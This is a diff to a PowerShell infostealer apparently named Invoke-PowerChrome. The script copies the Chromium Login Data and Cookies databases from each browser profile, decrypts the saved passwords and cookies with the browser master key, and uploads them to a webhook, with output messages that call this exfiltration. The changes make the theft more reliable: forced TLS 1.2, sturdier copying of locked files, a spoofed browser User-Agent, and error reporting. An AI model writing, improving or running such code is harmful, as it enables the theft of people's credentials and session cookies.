@@ -1,4 +1,6 @@
 try { Add-Type -AssemblyName System.Security } catch {}
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 
 function Invoke-FunctionLookup {
     Param (
@@ -504,8 +506,13 @@ function Get-ChromiumLoginBlobs {
 
     $TempDb = Join-Path $env:TEMP ("LoginData_{0}.db" -f ([guid]::NewGuid()))
     try {
-        Copy-Item -Path $LoginDataPath -Destination $TempDb -Force -ErrorAction SilentlyContinue
-    } catch { return @() }
+        # Using [System.IO.File]::Copy as it's often more robust with locked files
+        [System.IO.File]::Copy($LoginDataPath, $TempDb, $true)
+    } catch { 
+        Log "Warning: Failed to copy Login Data from $LoginDataPath"
+        return @() 
+    }
+
 
     $DbHandle = [IntPtr]::Zero
     if ($Sqlite3OpenV2.Invoke($TempDb, [ref]$DbHandle, 1, [IntPtr]::Zero) -ne 0) { return @() }
@@ -548,8 +555,12 @@ function Get-ChromiumCookieBlobs {
 
     $TempDb = Join-Path $env:TEMP ("Cookies_{0}.db" -f ([guid]::NewGuid()))
     try {
-        Copy-Item -Path $CookiePath -Destination $TempDb -Force -ErrorAction SilentlyContinue
-    } catch { return @() }
+        [System.IO.File]::Copy($CookiePath, $TempDb, $true)
+    } catch { 
+        Log "Warning: Failed to copy Cookies from $CookiePath"
+        return @() 
+    }
+
 
     $DbHandle = [IntPtr]::Zero
     if ($Sqlite3OpenV2.Invoke($TempDb, [ref]$DbHandle, 1, [IntPtr]::Zero) -ne 0) { return @() }
@@ -629,7 +640,11 @@ function Invoke-PowerChrome {
         }
     } catch { Log "Key decryption failed: $($_.Exception.Message)" }
 
-    if (-not $MasterKey) { Log "Could not obtain Master Key."; return $null }
+    if (-not $MasterKey) { 
+        Write-Host "[-] Could not obtain Master Key for $Browser. Encryption keys might be locked or inaccessible." -ForegroundColor Red
+        return $null 
+    }
+
 
     # 2. Iterate Profiles
     $Profiles = Get-ChildItem $UserDataPath -Directory | Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile *" }
@@ -637,9 +652,10 @@ function Invoke-PowerChrome {
     $AllCookies = @()
 
     foreach ($P in $Profiles) {
-        Log "Processing profile: $($P.Name)"
+        Write-Host "[*] Scanning Profile: $($P.Name) ($Browser)" -ForegroundColor Gray
         $RawLogins = Get-ChromiumLoginBlobs -ProfilePath $P.FullName
         $RawCookies = Get-ChromiumCookieBlobs -ProfilePath $P.FullName
+
 
         # Decrypt Logins
         foreach ($L in $RawLogins) {
@@ -720,15 +736,33 @@ if ($FinalLogins.Count -gt 0 -or $FinalCookies.Count -gt 0) {
         } else {
             Add-Type -AssemblyName System.Net.Http
             $Client = New-Object System.Net.Http.HttpClient
+            $Client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+            
             $Content = New-Object System.Net.Http.MultipartFormDataContent
-            $Content.Add((New-Object System.Net.Http.StringContent($Payload)), "payload_json")
+            
+            # Use specific media type for JSON payload
+            $JsonContent = New-Object System.Net.Http.StringContent($Payload, [System.Text.Encoding]::UTF8, "application/json")
+            $Content.Add($JsonContent, "payload_json")
+            
             $FileBytes = [System.IO.File]::ReadAllBytes($TempFile)
-            $Content.Add((New-Object System.Net.Http.ByteArrayContent($FileBytes)), "file", [System.IO.Path]::GetFileName($TempFile))
-            [void]$Client.PostAsync($Webhook, $Content).Result
+            $FileContent = New-Object System.Net.Http.ByteArrayContent($FileBytes)
+            $Content.Add($FileContent, "file", [System.IO.Path]::GetFileName($TempFile))
+            
+            $PostTask = $Client.PostAsync($Webhook, $Content)
+            $Response = $PostTask.Result
+            $Response.EnsureSuccessStatusCode() | Out-Null
             $Client.Dispose()
         }
+
         Write-Host "Success!" -ForegroundColor Green
-    } catch { Write-Host "Exfiltration failed!" } finally { Remove-Item $TempFile -Force -ErrorAction SilentlyContinue }
+    } catch { 
+        Write-Host "Exfiltration failed!" -ForegroundColor Red
+        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Gray
+        if ($_.Exception.InnerException) { Write-Host "Details: $($_.Exception.InnerException.Message)" -ForegroundColor Gray }
+    } finally { 
+        Remove-Item $TempFile -Force -ErrorAction SilentlyContinue 
+    }
+
 } else {
     Write-Host "No data found."
 }
